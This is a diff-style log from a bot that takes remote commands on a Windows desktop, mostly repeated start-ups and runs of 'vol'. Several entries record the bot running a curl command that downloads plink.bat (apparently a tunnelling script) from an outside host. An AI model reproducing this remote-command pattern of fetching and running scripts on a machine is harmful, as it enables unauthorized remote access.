+2020-07-19 12:46:12 - Info: Listening for commands on DESKTOP-U15DJ5J...
+2020-07-19 12:46:13 - Warning: cazzetto
+2020-07-19 12:46:13 - Warning: cazzetto
+2020-07-19 12:46:13 - Notice: Command  vol ran
+2020-07-19 12:46:23 - Warning: cazzetto
+2020-07-19 12:46:23 - Warning: cazzetto
+2020-07-19 12:46:23 - Notice: Command  vol ran
+2020-07-19 12:47:10 - Info: Starting
+2020-07-19 12:47:10 - SUCCESS: Setup done
+2020-07-19 12:47:10 - Info: Starting
+2020-07-19 12:47:10 - SUCCESS: Started
+2020-07-19 12:47:10 - Info: Listening for commands on DESKTOP-U15DJ5J...
+2020-07-19 12:47:11 - Warning: cazzetto
+2020-07-19 12:47:11 - Warning: cazzetto
+2020-07-19 12:47:11 - Notice: Command  vol ran
+2020-07-19 12:47:21 - Warning: cazzetto
+2020-07-19 12:47:21 - Warning: cazzetto
+2020-07-19 12:47:21 - Notice: Command  vol ran
+2020-07-19 12:47:31 - Warning: cazzetto
+2020-07-19 12:47:31 - Warning: cazzetto
+2020-07-19 12:47:31 - Notice: Command  vol ran
+2020-07-19 12:48:38 - Info: Starting
+2020-07-19 12:48:38 - SUCCESS: Setup done
+2020-07-19 12:48:38 - Info: Starting
+2020-07-19 12:48:38 - SUCCESS: Started
+2020-07-19 12:48:38 - Info: Listening for commands on DESKTOP-U15DJ5J...
+2020-07-19 12:48:38 - Warning: cazzetto
+2020-07-19 12:48:38 - Warning: cazzetto
+2020-07-19 12:48:38 - Notice: Command vol ran
+2020-07-19 12:48:49 - Warning: cazzetto
+2020-07-19 12:48:49 - Warning: cazzetto
+2020-07-19 12:48:49 - Notice: Command vol ran
+2020-07-19 12:48:59 - Warning: cazzetto
+2020-07-19 12:48:59 - Warning: cazzetto
+2020-07-19 12:48:59 - Notice: Command vol ran
+2020-07-19 12:49:09 - Warning: cazzetto
+2020-07-19 12:49:09 - Warning: cazzetto
+2020-07-19 12:49:09 - Notice: Command vol ran
+2020-07-19 12:49:19 - Warning: cazzetto
+2020-07-19 12:49:19 - Warning: cazzetto
+2020-07-19 12:49:19 - Notice: Command vol ran
+2020-07-19 12:49:30 - Warning: cazzetto
+2020-07-19 12:49:30 - Warning: cazzetto
+2020-07-19 12:49:30 - Notice: Command vol ran
+2020-07-19 12:49:40 - Warning: cazzetto
+2020-07-19 12:49:40 - Warning: cazzetto
+2020-07-19 12:49:40 - Notice: Command vol ran
+2020-07-19 12:50:31 - Warning: cazzetto
+2020-07-19 12:50:31 - Warning: cazzetto
+2020-07-19 12:50:31 - Notice: Command vol ran
+2020-07-19 12:50:31 - Notice: Command /cmd vol ran
+2020-07-19 12:50:41 - Warning: cazzetto
+2020-07-19 12:50:42 - Warning: cazzetto
+2020-07-19 12:50:42 - Notice: Command vol ran
+2020-07-19 12:50:42 - Notice: Command /cmd vol ran
+2020-07-19 12:52:03 - Warning: cazzetto
+2020-07-19 12:52:03 - Notice: Command curl http://troglo.homepc.it/win/plink.bat -o plink.bat ran
+2020-07-19 12:52:03 - Notice: Command /cmd curl http://troglo.homepc.it/win/plink.bat -o plink.bat ran
+2020-07-19 12:52:13 - Warning: cazzetto
+2020-07-19 12:52:13 - Notice: Command curl http://troglo.homepc.it/win/plink.bat -o plink.bat ran
+2020-07-19 12:52:14 - Notice: Command /cmd curl http://troglo.homepc.it/win/plink.bat -o plink.bat ran
+2020-07-19 13:01:25 - Info: Starting
+2020-07-19 13:01:25 - SUCCESS: Setup done
+2020-07-19 13:01:25 - Info: Starting
+2020-07-19 13:01:25 - SUCCESS: Started
+2020-07-19 13:01:25 - Info: Listening for commands on DESKTOP-U15DJ5J...
+2020-07-19 13:01:45 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 13:01:45 - ERROR: Details from previous errorlocal variable 're' referenced before assignment
+2020-07-19 13:01:45 - Notice: Command /cmd vol ran
+2020-07-19 13:01:55 - ERROR: BOT MISUSE: Unknown error running command or function.
+2020-07-19 13:01:55 - ERROR: Details from previous errorlocal variable 're' referenced before assignment
+2020-07-19 13:01:55 - Notice: Command /cmd vol ran
+2020-07-19 13:06:51 - Info: Starting
+2020-07-19 13:06:51 - SUCCESS: Setup done
+2020-07-19 13:06:51 - Info: Starting
+2020-07-19 13:06:51 - SUCCESS: Started
+2020-07-19 13:06:51 - Info: Listening for commands on DESKTOP-U15DJ5J...
+2020-07-19 13:06:52 - Warning: cazzetto
+2020-07-19 13:06:52 - Warning: cazzetto
+2020-07-19 13:06:52 - Notice: Command vol ran
+2020-07-19 13:07:21 - Info: Starting
+2020-07-19 13:07:21 - SUCCESS: Setup done
+2020-07-19 13:07:21 - Info: Starting
+2020-07-19 13:07:21 - SUCCESS: Started
+2020-07-19 13:07:21 - Info: Listening for commands on DESKTOP-U15DJ5J...
+2020-07-19 13:07:22 - Warning: cazzetto
+2020-07-19 13:07:22 - Warning: cazzetto
+2020-07-19 13:07:22 - Notice: Command vol ran
+2020-07-19 13:08:04 - Info: Starting
+2020-07-19 13:08:04 - SUCCESS: Setup done
+2020-07-19 13:08:04 - Info: Starting
+2020-07-19 13:08:04 - SUCCESS: Started
+2020-07-19 13:08:04 - Info: Listening for commands on DESKTOP-U15DJ5J...
+2020-07-19 13:08:04 - Warning: cazzetto
+2020-07-19 13:08:04 - Warning: cazzetto
+2020-07-19 13:08:04 - Warning: cazzetto
+2020-07-19 13:08:04 - Notice: Command curl http://troglo.homepc.it/win/plink.bat -o plink.bat ran
+2020-07-19 13:08:05 - Notice: Command /cmd curl http://troglo.homepc.it/win/plink.bat -o plink.bat ran
+2020-07-19 13:08:15 - Warning: cazzetto
+2020-07-19 13:08:15 - Warning: cazzetto
+2020-07-19 13:08:15 - Warning: cazzetto
+2020-07-19 13:08:15 - Notice: Command curl http://troglo.homepc.it/win/plink.bat -o plink.bat ran
+2020-07-19 13:08:15 - Notice: Command /cmd curl http://troglo.homepc.it/win/plink.bat -o plink.bat ran
+2020-07-19 16:16:38 - Info: Starting
+2020-07-19 16:16:39 - SUCCESS: Setup done
+2020-07-19 16:16:39 - Info: Starting
+2020-07-19 16:16:39 - SUCCESS: Started
+2020-07-19 16:16:39 - Info: Listening for commands on DESKTOP-U15DJ5J...
